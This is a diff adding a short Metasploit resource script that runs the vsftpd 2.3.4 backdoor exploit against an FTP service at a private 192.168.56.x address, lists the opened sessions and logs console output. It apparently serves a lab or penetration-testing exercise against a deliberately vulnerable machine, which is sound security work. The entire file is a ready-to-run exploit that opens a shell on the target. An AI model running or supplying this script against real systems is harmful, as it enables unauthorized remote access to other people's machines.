@@ -1,0 +1,9 @@
+spool artifacts/raw/msf_console.log
+setg RHOSTS 192.168.56.110
+setg LHOST 192.168.56.101
+use exploit/unix/ftp/vsftpd_234_backdoor
+set RPORT 21
+run
+sessions -l
+spool off
+exit
